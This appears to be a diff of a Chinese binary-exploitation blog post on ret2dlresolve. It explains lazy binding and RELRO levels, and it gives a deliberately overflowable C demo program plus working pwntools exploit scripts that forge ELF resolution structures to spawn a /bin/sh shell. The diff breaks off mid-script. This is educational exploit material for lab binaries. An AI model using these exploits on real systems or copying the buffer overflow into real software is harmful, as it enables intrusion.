@@ -90,13 +90,13 @@
     <p class="kk-profile-bio">二进制安全学习中 / PWN / 漏洞挖掘</p>
     <div class="kk-profile-stats">
       <a class="kk-stat" href="/archives">
-        <b>10</b><span>文章</span>
+        <b>12</b><span>文章</span>
       </a>
       <a class="kk-stat" href="/categories">
         <b>3</b><span>分类</span>
       </a>
       <a class="kk-stat" href="/tags">
-        <b>24</b><span>标签</span>
+        <b>30</b><span>标签</span>
       </a>
     </div>
     
@@ -124,7 +124,7 @@
     
     
     <blockquote class="kk-hitokoto">
-      <span class="kk-hitokoto-mark">「</span>在 0 与 1 之间，寻找世界的缝隙。<span class="kk-hitokoto-mark">」</span>
+      <span class="kk-hitokoto-mark">「</span>所谓漏洞，是被遗忘的边界。<span class="kk-hitokoto-mark">」</span>
     </blockquote>
     
   </div>
@@ -150,8 +150,8 @@
           <a class="kk-chip kk-chip-glass" href="/categories/PWN/">PWN</a>
         
       
-      <span class="kk-chip kk-chip-glass">3.9k 字</span>
-      <span class="kk-chip kk-chip-glass">约 10 分钟</span>
+      <span class="kk-chip kk-chip-glass">1w 字</span>
+      <span class="kk-chip kk-chip-glass">约 26 分钟</span>
     </div>
   </header>
 
@@ -187,35 +187,105 @@
 
 <h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>适用ret2dlresolve的场景，以下条件应同时满足</p>
 <ul>
-<li>没有任何信息泄露</li>
-<li>没有开启Full RELRO（一般情况）</li>
-<li>栈空间足够大</li>
-<li>远程Libc版本未知</li>
-<li>i386至少要能控制<code>esp</code>寄存器，amd64至少要能控制<code>rdi</code>和<code>rsp</code>寄存器</li>
+<li>没有任何信息泄露（libc 基址未知）</li>
+<li>目标存在延迟绑定（No RELRO 或 Partial RELRO）</li>
+<li>有一块地址已知的可写内存（No PIE 时的 bss 即可）</li>
+<li>i386 至少要能控制<code>esp</code>寄存器，amd64 至少要能控制<code>rdi</code>和<code>rsp</code>寄存器</li>
 </ul>
-<h2 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h2><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><ol>
-<li><p>控制可读写的内存</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload1 = flat(</span><br><span class="line">    <span class="string">b&quot;A&quot;</span> * <span class="number">112</span>,</span><br><span class="line">    p64(bss + <span class="number">0x800</span>),</span><br><span class="line">    p64(pop_rdi),</span><br><span class="line">    p64(<span class="number">0</span>),</span><br><span class="line">    p64(pop_rsi),</span><br><span class="line">    p64(bss+<span class="number">0x40</span>),</span><br><span class="line">    p64(read_plt),</span><br><span class="line">    p64(vuln),  <span class="comment"># 调试可知此时rdx正好为0x100</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.send(payload1.ljust(<span class="number">0x100</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取各节的地址</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rela_plt_addr = elf.get_section_by_name(<span class="string">&quot;.rela.plt&quot;</span>).header.sh_addr <span class="comment"># 0x400590</span></span><br><span class="line">dynsym_addr = elf.get_section_by_name(<span class="string">&quot;.dynsym&quot;</span>).header.sh_addr <span class="comment"># 0x3fe440</span></span><br><span class="line">dynstr_addr = elf.get_section_by_name(<span class="string">&quot;.dynstr&quot;</span>).header.sh_addr <span class="comment"># 0x3fe50</span></span><br><span class="line">plt0_addr = elf.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr <span class="comment">#0x401020</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>设计伪造的地址</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fake_rel_addr = bss</span><br><span class="line">fake_sym_addr = fake_rel_addr + <span class="number">0x18</span> </span><br><span class="line">fake_str_addr = fake_sym_addr + <span class="number">0x18</span>  <span class="comment"># system字符串的地址</span></span><br><span class="line">bin_sh_addr = fake_str_addr + <span class="built_in">len</span>(<span class="string">b&quot;system\x00\x00&quot;</span>)  <span class="comment"># /bin/sh字符串的地址</span></span><br></pre></td></tr></table></figure>
-<p> 注意<code>fake_rel_addr - rela_plt_addr</code> 和 <code>fake_sym_addr - dynsym_addr</code>需要 0x18字节的对齐</p>
-</li>
-<li><p>伪造.rela.plt</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sym_index  = (fake_sym_addr - dynsym_addr) // <span class="number">0x18</span></span><br><span class="line">log.success(<span class="string">&quot;sym_index: &quot;</span> + <span class="built_in">hex</span>((fake_sym_addr - dynsym_addr) % <span class="number">0x18</span>))</span><br><span class="line">r_offset = <span class="number">0x404020</span> <span class="comment"># read@got[plt]</span></span><br><span class="line">r_info = (sym_index &lt;&lt; <span class="number">32</span>) | <span class="number">0x7</span>  <span class="comment"># R_X86_64_JUMP_SLOT = 7</span></span><br><span class="line">r_addend = <span class="number">0</span></span><br><span class="line">fake_rel = p64(r_offset) + p64(r_info) + p64(r_addend)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>伪造.dynsym</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">st_name_addr = fake_str_addr - dynstr_addr</span><br><span class="line">st_info = <span class="number">0x12</span></span><br><span class="line">fake_sym = p32(st_name_addr) + p8(st_info) + p8(<span class="number">0</span>) + p16(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>将伪造的结构写入可以读写的内存</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2 = fake_rel + fake_sym + <span class="string">b&quot;system\x00\x00&quot;</span> + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">p.send(payload2.ljust(<span class="number">0x100</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>触发符号解析</p>
- <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">reloc_arg = (fake_rel_addr - rela_plt_addr) // <span class="number">0x18</span></span><br><span class="line">log.success(<span class="string">&quot;reloc_arg: &quot;</span> + <span class="built_in">hex</span>((fake_rel_addr - rela_plt_addr) % <span class="number">0x18</span>))</span><br><span class="line">payload3 = flat(</span><br><span class="line">    <span class="string">b&quot;A&quot;</span> * <span class="number">112</span>,</span><br><span class="line">    p64(bss + <span class="number">0x900</span>),</span><br><span class="line">    p64(pop_rdi),</span><br><span class="line">    p64(bin_sh_addr),</span><br><span class="line">    p64(plt0_addr),</span><br><span class="line">    p64(reloc_arg)</span><br><span class="line">)</span><br><span class="line">p.send(payload3.ljust(<span class="number">0x100</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure></li>
+<h2 id="延迟绑定原理"><a href="#延迟绑定原理" class="headerlink" title="延迟绑定原理"></a>延迟绑定原理</h2><p>动态链接的函数第一次被调用时走的是延迟绑定流程：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">func@plt  →  jmp *func@got</span><br><span class="line">                 │ 首次调用时 got 里存的是 plt 中的下一条指令</span><br><span class="line">                 ▼</span><br><span class="line">          push reloc_arg</span><br><span class="line">          jmp plt[0]  →  push link_map（GOT[1]）</span><br><span class="line">                          jmp *_dl_runtime_resolve（GOT[2]）</span><br></pre></td></tr></table></figure>
+
+<p><code>_dl_runtime_resolve(link_map, reloc_arg)</code> 在 <code>_dl_fixup</code> 中完成解析：</p>
+<ol>
+<li>由 reloc_arg 找到重定位项 <code>Elf32_Rel / Elf64_Rela</code>（位于 .rel.plt &#x2F; .rela.plt）</li>
+<li>由 <code>r_info</code> 中的符号索引找到符号 <code>Elf32_Sym / Elf64_Sym</code>（位于 .dynsym）</li>
+<li>由 <code>sym-&gt;st_name</code> 在 .dynstr 中读出符号名字符串</li>
+<li>在已加载的库中查找该名字，把函数地址写回 <code>r_offset</code> 指向的 got 项，并调用它</li>
 </ol>
+<p>ret2dlresolve 的核心就是<strong>伪造这条解析链上的结构体</strong>，让符号名变成 <code>&quot;system&quot;</code>，从而把任意一次 plt 调用变成 <code>system(&quot;/bin/sh&quot;)</code>。</p>
+<p>RELRO 等级决定了解析链上哪些环节可写，对应不同的打法：</p>
+<table>
+<thead>
+<tr>
+<th>级别</th>
+<th>编译选项</th>
+<th>.dynamic</th>
+<th>.got.plt</th>
+<th>延迟绑定</th>
+<th>打法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>No RELRO</td>
+<td><code>-Wl,-z,norelro</code></td>
+<td>可写</td>
+<td>可写</td>
+<td>有</td>
+<td>改写 DT_STRTAB</td>
+</tr>
+<tr>
+<td>Partial RELRO</td>
+<td>默认</td>
+<td>只读</td>
+<td>可写</td>
+<td>有</td>
+<td>伪造 Rel&#x2F;Sym 结构体</td>
+</tr>
+<tr>
+<td>Full RELRO</td>
+<td><code>-Wl,-z,relro,-z,now</code></td>
+<td>只读</td>
+<td>并入 .got，只读</td>
+<td>无</td>
+<td>经典手法失效</td>
+</tr>
+</tbody></table>
+<p>演示用漏洞程序如下。注意新版 glibc（≥ 2.34）不再链接 <code>__libc_csu_init</code>，小程序里找不到 pop 系列 gadget——真实题目中这些 gadget 来自 csu 或程序自身代码，这里用内联汇编补齐；32 位下参数在栈上，不需要这些 gadget。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;.global pop_rdi\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop_rdi: pop %rdi; ret\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.global pop_rsi\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop_rsi: pop %rsi; ret\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.global pop_rdx\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop_rdx: pop %rdx; ret\n&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x60</span>];</span><br><span class="line">    <span class="comment">/* 让 puts 出现在 PLT 中但正常运行时不会被调用 */</span></span><br><span class="line">    <span class="keyword">if</span> (read(<span class="number">0</span>, buf, <span class="number">0x200</span>) == <span class="number">0x1337</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另外下面两处 st_name、strtab_ptr 的计算两个场景通用，先给出辅助代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">st_name_of</span>(<span class="params">elf, name, bits</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;符号 name 的 st_name（符号名字符串在 .dynstr 中的偏移）&quot;&quot;&quot;</span></span><br><span class="line">    syms = elf.get_section_by_name(<span class="string">&quot;.dynsym&quot;</span>).data()</span><br><span class="line">    strs = elf.get_section_by_name(<span class="string">&quot;.dynstr&quot;</span>).data()</span><br><span class="line">    size = <span class="number">0x18</span> <span class="keyword">if</span> bits == <span class="number">64</span> <span class="keyword">else</span> <span class="number">0x10</span></span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(syms), size):</span><br><span class="line">        st_name = u32(syms[off:off+<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">if</span> strs[st_name:strs.index(<span class="string">b&quot;\x00&quot;</span>, st_name)] == name.encode():</span><br><span class="line">            <span class="keyword">return</span> st_name</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;symbol not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strtab_ptr_of</span>(<span class="params">elf, bits</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;.dynamic 中 DT_STRTAB 条目的值字段地址&quot;&quot;&quot;</span></span><br><span class="line">    dyn = elf.get_section_by_name(<span class="string">&quot;.dynamic&quot;</span>).header.sh_addr</span><br><span class="line">    ddata = elf.get_section_by_name(<span class="string">&quot;.dynamic&quot;</span>).data()</span><br><span class="line">    <span class="keyword">if</span> bits == <span class="number">64</span>:  <span class="comment"># Elf64_Dyn 16 字节，值在 +8</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ddata), <span class="number">0x10</span>):</span><br><span class="line">            <span class="keyword">if</span> u64(ddata[i:i+<span class="number">8</span>]) == <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">return</span> dyn + i + <span class="number">8</span></span><br><span class="line">    <span class="keyword">else</span>:           <span class="comment"># Elf32_Dyn 8 字节，值在 +4</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ddata), <span class="number">0x8</span>):</span><br><span class="line">            <span class="keyword">if</span> u32(ddata[i:i+<span class="number">4</span>]) == <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">return</span> dyn + i + <span class="number">4</span></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;DT_STRTAB not found&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="32-位"><a href="#32-位" class="headerlink" title="32 位"></a>32 位</h2><h3 id="No-RELRO：改写-DT-STRTAB"><a href="#No-RELRO：改写-DT-STRTAB" class="headerlink" title="No RELRO：改写 DT_STRTAB"></a>No RELRO：改写 DT_STRTAB</h3><p>No RELRO 时 .dynamic 可写，而 <code>_dl_fixup</code> 每次都通过 <code>link_map-&gt;l_info[DT_STRTAB]</code> 读取字符串表地址，因此：</p>
+<ol>
+<li>把 .dynamic 中 DT_STRTAB 条目的值改写为伪造字符串表的地址</li>
+<li>伪造字符串表中，在原符号 <code>st_name</code> 偏移处放上 <code>&quot;system&quot;</code></li>
+<li>正常调用一个<strong>还没被解析过</strong>的 plt 函数，解析出来的就是 system</li>
+</ol>
+<p>注意触发函数必须尚未解析：read 已经被 vuln 调用过、got 已回填，不会再走解析流程，所以这里用从未执行的 puts@plt 做触发。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./vuln32_norelro&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./vuln32_norelro&quot;</span>)</span><br><span class="line"></span><br><span class="line">PAD = <span class="number">0x6c</span>          <span class="comment"># buf[0x60] 到返回地址的距离，按实际调试为准</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">vuln = elf.symbols[<span class="string">&quot;vuln&quot;</span>]</span><br><span class="line">strtab_ptr = strtab_ptr_of(elf, <span class="number">32</span>)</span><br><span class="line">st_name = st_name_of(elf, <span class="string">&quot;puts&quot;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">fake_strtab = elf.bss() + <span class="number">0x400</span></span><br><span class="line">bin_sh = fake_strtab + st_name + <span class="built_in">len</span>(<span class="string">b&quot;system\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 改写 DT_STRTAB 指向 fake_strtab</span></span><br><span class="line">p.send(flat(<span class="string">b&quot;A&quot;</span>*PAD, read_plt, vuln, <span class="number">0</span>, strtab_ptr, <span class="number">4</span>))</span><br><span class="line">p.send(p32(fake_strtab))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 写伪造字符串表：st_name 偏移处放 &quot;system&quot;，后面跟 &quot;/bin/sh&quot;</span></span><br><span class="line">p.send(flat(<span class="string">b&quot;A&quot;</span>*PAD, read_plt, vuln, <span class="number">0</span>, fake_strtab, <span class="number">0x40</span>))</span><br><span class="line">p.send(<span class="string">b&quot;A&quot;</span>*st_name + <span class="string">b&quot;system\x00&quot;</span> + <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 调用 puts@plt，_dl_fixup 按伪造字符串表解析出 system</span></span><br><span class="line">p.send(flat(<span class="string">b&quot;A&quot;</span>*PAD, puts_plt, <span class="number">0xdeadbeef</span>, bin_sh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Partial-RELRO：伪造-Elf32-Rel-Elf32-Sym"><a href="#Partial-RELRO：伪造-Elf32-Rel-Elf32-Sym" class="headerlink" title="Partial RELRO：伪造 Elf32_Rel &#x2F; Elf32_Sym"></a>Partial RELRO：伪造 Elf32_Rel &#x2F; Elf32_Sym</h3><p>Partial RELRO 下 .dynamic 只读，改为在可写内存中伪造整条解析链：</p>
+<ul>
+<li><code>Elf32_Rel</code>（8 字节）：<code>r_offset</code> 指向任意可写 got 项，<code>r_info = (sym_index &lt;&lt; 8) | 7</code>（R_386_JUMP_SLOT）</li>
+<li><code>Elf32_Sym</code>（16 字节）：<code>st_name</code> 为 “system” 到 .dynstr 的偏移，<code>st_info = 0x12</code></li>
+<li>触发时直接跳 plt[0]，压入伪造重定位项到 .rel.plt 的<strong>字节偏移</strong>（32 位是偏移，不是索引）</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./vuln32_partial&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./vuln32_partial&quot;</span>)</span><br><span class="line"></span><br><span class="line">PAD = <span class="number">0x6c</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&quot;.rel.plt&quot;</span>).header.sh_addr</span><br><span class="line">dynsym  = elf.get_section_by_name(<span class="string">&quot;.dynsym&quot;</span>).header.sh_addr</span><br><span class="line">dynstr  = elf.get_section_by_name(<span class="string">&quot;.dynstr&quot;</span>).header.sh_addr</span><br><span class="line">plt0    = elf.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line">read_plt = elf.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">vuln = elf.symbols[<span class="string">&quot;vuln&quot;</span>]</span><br><span class="line">got_read = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">bss = elf.bss() + <span class="number">0x400</span></span><br><span class="line"><span class="comment"># 对齐：fake_rel - rel_plt 是 8 的倍数，fake_sym - dynsym 是 16 的倍数</span></span><br><span class="line">fake_rel = bss + (rel_plt - bss) % <span class="number">0x8</span></span><br><span class="line">gap = (dynsym - fake_rel) % <span class="number">0x10</span></span><br><span class="line"><span class="keyword">if</span> gap &lt; <span class="number">0x8</span>:</span><br><span class="line">    gap += <span class="number">0x10</span></span><br><span class="line">fake_sym = fake_rel + gap</span><br><span class="line">str_addr = fake_sym + <span class="number">0x10</span></span><br><span class="line">bin_sh = str_addr + <span class="number">0x8</span></span><br><span class="line">sym_index = (fake_sym - dynsym) // <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 把伪造的结构体读进 bss</span></span><br><span class="line">p.send(flat(<span class="string">b&quot;A&quot;</span>*PAD, read_plt, vuln, <span class="number">0</span>, fake_rel, <span class="number">0x200</span>))</span><br><span class="line">st_name = str_addr - dynstr</span><br><span class="line">payload2 = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: p32(got_read) + p32((sym_index &lt;&lt; <span class="number">8</span>) | <span class="number">7</span>),</span><br><span class="line">    gap:  p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p8(<span class="number">0x12</span>) + p8(<span class="number">0</span>) + p16(<span class="number">0</span>),</span><br><span class="line">    gap + <span class="number">0x10</span>: <span class="string">b&quot;system\x00\x00&quot;</span>,</span><br><span class="line">    gap + <span class="number">0x18</span>: <span class="string">b&quot;/bin/sh\x00&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 跳 plt[0]，压入 fake_rel 的字节偏移触发解析</span></span><br><span class="line"><span class="comment">#    解析完成后以 0xdeadbeef 为返回地址调用 system(bin_sh)</span></span><br><span class="line">p.send(flat(<span class="string">b&quot;A&quot;</span>*PAD, plt0, fake_rel - rel_plt, <span class="number">0xdeadbeef</span>, bin_sh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>如果解析时崩溃，优先检查 .gnu.version 校验：glibc 会用 sym_index 索引 versym 数组，伪造的 sym_index 很大，需要让 <code>versym + 2*sym_index</code> 处恰好读到 0（微调 fake_rel&#x2F;fake_sym 的位置，或直接交给后文的 pwntools 自动布局）。</p>
+<h3 id="Full-RELRO：经典手法失效"><a href="#Full-RELRO：经典手法失效" class="headerlink" title="Full RELRO：经典手法失效"></a>Full RELRO：经典手法失效</h3><p>Full RELRO（<code>-z now</code>）下所有符号在程序启动时就完成解析（BIND_NOW），got 全部只读，plt 中不再有压入 reloc_arg 的 resolver 桩，<code>_dl_runtime_resolve</code> 不会再经由 GOT[2] 调用，经典 ret2dlresolve 失效。</p>
+<p>进阶手法（需要任意地址写 + ld.so 基址泄露）：ld.so 内存中的 <code>link_map</code> 结构体始终可写，篡改其 <code>l_info[DT_STRTAB]</code> 指向伪造的 <code>Elf32_Dyn</code>（其 d_ptr 指向伪造字符串表），再直接调用 ld.so 内的 <code>_dl_runtime_resolve(link_map, reloc_arg)</code> 完成解析。有任意写和泄露之后通常已有更直接的利用方式，此手法了解原理即可。</p>
+<h2 id="64-位"><a href="#64-位" class="headerlink" title="64 位"></a>64 位</h2><h3 id="No-RELRO：改写-DT-STRTAB-1"><a href="#No-RELRO：改写-DT-STRTAB-1" class="headerlink" title="No RELRO：改写 DT_STRTAB"></a>No RELRO：改写 DT_STRTAB</h3><p>思路与 32 位一致，差异：</p>
+<ul>
+<li><code>Elf64_Dyn</code> 为 16 字节，DT_STRTAB 的值字段在条目 +8 处</li>
+<li>参数走寄存器，需要 pop rdi&#x2F;rsi&#x2F;rdx 系列 gadget 调用 read 完成写入</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./vuln64_norelro&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./vuln64_norelro&quot;</span>)</span><br><span class="line"></span><br><span class="line">PAD = <span class="number">0x68</span></span><br><span class="line">pop_rdi = elf.symbols[<span class="string">&quot;pop_rdi&quot;</span>]</span><br><span class="line">pop_rsi = elf.symbols[<span class="string">&quot;pop_rsi&quot;</span>]</span><br><span class="line">pop_rdx = elf.symbols[<span class="string">&quot;pop_rdx&quot;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">vuln = elf.symbols[<span class="string">&quot;vuln&quot;</span>]</span><br><span class="line">strtab_ptr = strtab_ptr_of(elf, <span class="number">64</span>)</span><br><span class="line">st_name = st_name_of(elf, <span class="string">&quot;puts&quot;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">fake_strtab = elf.bss() + <span class="number">0x800</span></span><br><span class="line">bin_sh = fake_strtab + st_name + <span class="built_in">len</span>(<span class="string">b&quot;system\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 改写 DT_STRTAB</span></span><br><span class="line">p.send(flat(<span class="string">b&quot;A&quot;</span>*PAD, pop_rdi, <span class="number">0</span>, pop_rsi, strtab_ptr, pop_rdx, <span class="number">8</span>, read_plt, vuln))</span><br><span class="line">p.send(p64(fake_strtab))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 写伪造字符串表</span></span><br><span class="line">p.send(flat(<span class="string">b&quot;A&quot;</span>*PAD, pop_rdi, <span class="number">0</span>, pop_rsi, fake_strtab, pop_rdx, <span class="number">0x100</span>, read_plt, vuln))</span><br><span class="line">p.send(<span class="string">b&quot;A&quot;</span>*st_name + <span class="string">b&quot;system\x00&quot;</span> + <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 